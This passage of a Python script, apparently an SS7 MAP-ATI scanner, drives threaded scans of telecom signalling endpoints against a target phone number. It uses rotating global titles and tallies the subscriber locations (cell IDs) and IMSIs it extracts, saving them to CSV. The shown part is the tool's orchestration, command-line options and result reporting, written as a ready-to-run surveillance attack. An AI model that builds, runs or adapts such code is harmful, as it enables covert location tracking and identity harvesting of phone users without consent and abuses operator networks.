            logger.debug(f"[{unique_id}] Exception traceback:", exc_info=True)
    
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
    
    result.duration_ms = (time.time() - start_time) * 1000
    return result

def scan_batch_professional(ip_port_pairs: List[Tuple[str, int]], target_msisdn: str) -> List[ScanResult]:
    """Professional batch scanning with thread pool and elegant progress display"""
    
    results = []
    total_pairs = len(ip_port_pairs)
    
    progress_content = [
        f"🚀 Starting professional batch scan",
        f"🎯 Total targets: {total_pairs}",
        f"👥 Worker threads: {PROFESSIONAL_CONFIG['max_workers']}",
        f"🔄 Retry attempts: {PROFESSIONAL_CONFIG['retry_attempts']}"
    ]
    
    print_elegant_box("BATCH SCAN INITIALIZATION", progress_content, 
                     Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
    
    with ThreadPoolExecutor(max_workers=PROFESSIONAL_CONFIG['max_workers']) as executor:
        # Submit all scan tasks
        future_to_target = {}
        
        for ip, port in ip_port_pairs:
            for attempt in range(1, PROFESSIONAL_CONFIG['retry_attempts'] + 1):
                future = executor.submit(scan_target_professional, ip, port, target_msisdn, attempt)
                future_to_target[future] = (ip, port, attempt)
        
        # Process completed scans
        completed = 0
        for future in as_completed(future_to_target):
            ip, port, attempt = future_to_target[future]
            
            try:
                result = future.result()
                results.append(result)
                
                # Update statistics
                update_professional_statistics(result, time.time())
                
                # Display result if significant
                if (result.success or result.location_info.cgi_found or 
                    result.subscriber_info.imsi != "N/A" or 
                    attempt == PROFESSIONAL_CONFIG['retry_attempts']):
                    display_professional_result(result, f"{ip}:{port}:A{attempt}")
                
                completed += 1
                
                # Progress update
                if completed % 100 == 0:
                    progress = (completed / (total_pairs * PROFESSIONAL_CONFIG['retry_attempts'])) * 100
                    print_colored(f"📊 Progress: {completed} completed ({progress:.1f}%)", 
                                Colors.CYAN, bold=True)
                
                # Add delay between retries for same target
                if attempt < PROFESSIONAL_CONFIG['retry_attempts'] and not result.success:
                    time.sleep(PROFESSIONAL_CONFIG['retry_delay'])
            
            except Exception as e:
                if logger:
                    logger.error(f"Future processing error for {ip}:{port}:{attempt}: {e}")
    
    return results

def display_professional_statistics(results: List[ScanResult]):
    """Display comprehensive professional statistics in elegant boxes"""
    
    with stats_lock:
        stats = PROFESSIONAL_STATS.copy()
    
    # Basic Statistics Box
    basic_stats = [
        f"🎯 Total Attempts: {stats['total_attempts']}",
        f"✅ Successful Responses: {stats['successful_responses']}",
        f"📊 Success Rate: {stats['success_rate']:.2f}%"
    ]
    
    print_elegant_box("BASIC METRICS", basic_stats, 
                     Colors.BRIGHT_YELLOW, Colors.BRIGHT_WHITE, Colors.WHITE)
    
    # Data Extraction Statistics Box
    extraction_stats = [
        f"🏆 Full Info Extractions: {stats['full_info_extractions']}",
        f"📍 Location Extractions: {stats['location_extractions']}",
        f"📱 IMSI Extractions: {stats['imsi_extractions']}",
        f"⏰ Timeouts: {stats['timeouts']}",
        f"❌ MAP Errors: {stats['map_errors']}"
    ]
    
    print_elegant_box("DATA EXTRACTION RESULTS", extraction_stats, 
                     Colors.BRIGHT_MAGENTA, Colors.BRIGHT_WHITE, Colors.WHITE)
    
    # Performance Metrics Box
    if stats['successful_responses'] > 0:
        perf_stats = [
            f"🚀 Fastest Response: {stats['fastest_response']:.2f}ms",
            f"🐌 Slowest Response: {stats['slowest_response']:.2f}ms"
        ]
        
        # Calculate average response time
        response_times = [r.response_time_ms for r in results if r.response_time_ms > 0]
        if response_times:
            avg_response = sum(response_times) / len(response_times)
            perf_stats.append(f"📊 Average Response: {avg_response:.2f}ms")
        
        print_elegant_box("PERFORMANCE METRICS", perf_stats, 
                         Colors.BRIGHT_BLUE, Colors.BRIGHT_WHITE, Colors.WHITE)

def load_ip_addresses_professional(ips_file: str) -> List[str]:
    """Load IP addresses from file with enhanced validation"""
    
    ips_path = Path(ips_file)
    
    if not ips_path.exists():
        error_content = [f"❌ IP file not found: {ips_file}"]
        print_elegant_box("FILE ERROR", error_content, Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
        sys.exit(1)
    
    try:
        with open(ips_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        valid_ips = []
        invalid_count = 0
        
        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            
            if not line or line.startswith('#'):
                continue
            
            # Basic IP validation
            try:
                socket.inet_aton(line)
                valid_ips.append(line)
            except socket.error:
                invalid_count += 1
                if logger:
                    logger.warning(f"Invalid IP at line {line_num}: {line}")
        
        load_stats = [
            f"📋 Loaded {len(valid_ips)} valid IPs from {ips_file}"
        ]
        
        if invalid_count > 0:
            load_stats.append(f"⚠️  Skipped {invalid_count} invalid IP addresses")
        
        print_elegant_box("IP ADDRESS LOADING", load_stats, 
                         Colors.GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
        
        return valid_ips
        
    except Exception as e:
        error_content = [f"❌ Error loading IP file: {e}"]
        print_elegant_box("LOADING ERROR", error_content, Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
        sys.exit(1)

def generate_ip_port_pairs(ips: List[str], ports: List[int]) -> List[Tuple[str, int]]:
    """Generate IP:port pairs with intelligent distribution"""
    
    pairs = []
    
    for ip in ips:
        for port in ports:
            pairs.append((ip, port))
    
    # Shuffle for better distribution
    random.shuffle(pairs)
    
    pair_stats = [f"🎯 Generated {len(pairs)} IP:port combinations"]
    print_elegant_box("PAIR GENERATION", pair_stats, 
                     Colors.CYAN, Colors.BRIGHT_WHITE, Colors.WHITE)
    return pairs

def setup_professional_environment() -> Tuple[Path, Path]:
    """Setup professional environment with enhanced directory structure"""
    
    # Create results directory
    results_dir = Path(PROFESSIONAL_CONFIG['results_dir'])
    results_dir.mkdir(exist_ok=True)
    
    # Create timestamped subdirectory
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_dir = results_dir / f"scan_session_{timestamp}"
    session_dir.mkdir(exist_ok=True)
    
    # Setup file paths
    csv_file = session_dir / f"professional_results_{timestamp}.csv"
    log_file = session_dir / f"professional_scan_{timestamp}.log"
    
    env_stats = [
        f"📁 Results directory: {session_dir}",
        f"📊 CSV file: {csv_file.name}",
        f"📝 Log file: {log_file.name}"
    ]
    
    print_elegant_box("ENVIRONMENT SETUP", env_stats, 
                     Colors.CYAN, Colors.BRIGHT_WHITE, Colors.WHITE)
    
    return csv_file, log_file

def main_professional():
    """Main professional execution function with enhanced orchestration"""
    
    global logger, gt_pool
    
    # Print professional banner
    print_professional_banner()
    
    # Setup argument parser
    parser = argparse.ArgumentParser(
        description="Enhanced MAP-ATI Scanner v5.2 - Professional Edition with Fixed Transmission",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-t', '--target', 
                       default=PROFESSIONAL_CONFIG['target_msisdn'],
                       help='Target MSISDN number (default: %(default)s)')
    
    parser.add_argument('-i', '--ips', 
                       default=PROFESSIONAL_CONFIG['ips_file'],
                       help='File containing IP addresses (default: %(default)s)')
    
    parser.add_argument('-w', '--workers',
                       type=int,
                       default=PROFESSIONAL_CONFIG['max_workers'],
                       help='Number of worker threads (default: %(default)s)')
    
    parser.add_argument('-r', '--retries',
                       type=int, 
                       default=PROFESSIONAL_CONFIG['retry_attempts'],
                       help='Number of retry attempts (default: %(default)s)')
    
    parser.add_argument('-v', '--verbose',
                       action='store_true',
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Update configuration
    PROFESSIONAL_CONFIG['target_msisdn'] = args.target
    PROFESSIONAL_CONFIG['ips_file'] = args.ips
    PROFESSIONAL_CONFIG['max_workers'] = args.workers
    PROFESSIONAL_CONFIG['retry_attempts'] = args.retries
    
    # Setup environment
    csv_file, log_file = setup_professional_environment()
    
    # Setup logging
    log_level = "DEBUG" if args.verbose else "INFO"
    logger = setup_professional_logging(log_file, log_level)
    
    # Initialize GT Pool
    gt_pool = ProfessionalGTPool(
        SCCP_PROFESSIONAL['cgpa_gt_digits'], 
        PROFESSIONAL_CONFIG['gt_pool_size']
    )
    
    # Display configuration
    config_content = [
        f"🎯 Target MSISDN: {args.target}",
        f"👥 Worker Threads: {args.workers}",
        f"🔄 Retry Attempts: {args.retries}",
        f"📝 Verbose Logging: {'Enabled' if args.verbose else 'Disabled'}"
    ]
    
    print_elegant_box("SCAN CONFIGURATION", config_content, 
                     Colors.BRIGHT_YELLOW, Colors.BRIGHT_WHITE, Colors.WHITE)
    
    # Load IP addresses
    ips = load_ip_addresses_professional(args.ips)
    
    if not ips:
        error_content = ["❌ No valid IP addresses found"]
        print_elegant_box("ERROR", error_content, Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
        sys.exit(1)
    
    # Generate IP:port pairs
    ip_port_pairs = generate_ip_port_pairs(ips, PROFESSIONAL_CONFIG['sctp_ports'])
    
    # Initialize statistics
    PROFESSIONAL_STATS['start_time'] = time.time()
    
    # Start scan notification
    start_content = [
        f"🚀 Starting professional MAP-ATI scan...",
        f"⏰ Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    ]
    
    print_elegant_box("SCAN INITIATION", start_content, 
                     Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
    
    try:
        # Execute batch scan
        results = scan_batch_professional(ip_port_pairs, args.target)
        
        # Save all results
        save_content = [f"💾 Saving {len(results)} results to CSV..."]
        print_elegant_box("RESULTS SAVING", save_content, 
                         Colors.CYAN, Colors.BRIGHT_WHITE, Colors.WHITE)
        
        for result in results:
            save_result_to_csv(result, csv_file)
        
        # Display final statistics
        display_professional_statistics(results)
        
        # Success summary
        successful_results = [r for r in results if r.success]
        location_results = [r for r in results if r.location_info.cgi_found]
        imsi_results = [r for r in results if r.subscriber_info.imsi != "N/A"]
        
        # Scan duration
        total_duration = time.time() - PROFESSIONAL_STATS['start_time']
        
        summary_content = [
            f"📊 Total Results: {len(results)}",
            f"✅ Successful: {len(successful_results)}",
            f"📍 With Location: {len(location_results)}",
            f"📱 With IMSI: {len(imsi_results)}",
            f"📄 Results saved to: {csv_file}",
            f"⏱️  Total Duration: {total_duration:.2f} seconds"
        ]
        
        print_elegant_box("SCAN COMPLETED SUCCESSFULLY!", summary_content, 
                         Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
        
    except KeyboardInterrupt:
        interrupt_content = [
            f"🛑 Scan interrupted by user",
            f"📊 Partial results may be available in: {csv_file}"
        ]
        print_elegant_box("SCAN INTERRUPTED", interrupt_content, 
                         Colors.YELLOW, Colors.BRIGHT_WHITE, Colors.WHITE)
        
    except Exception as e:
        error_content = [
            f"❌ Scan failed with error: {e}",
            f"📝 Check log file for details: {log_file}"
        ]
        print_elegant_box("SCAN FAILED", error_content, 
                         Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
        if logger:
            logger.error(f"Main execution error: {e}", exc_info=True)
        sys.exit(1)
    
    finally:
        if logger:
            logger.info("Professional MAP-ATI scan completed")

if __name__ == "__main__":
    try:
        main_professional()
    except Exception as e:
        error_content = [f"❌ Fatal error: {e}"]
        print_elegant_box("FATAL ERROR", error_content, Colors.BRIGHT_RED, Colors.BRIGHT_WHITE, Colors.WHITE)
        sys.exit(1)
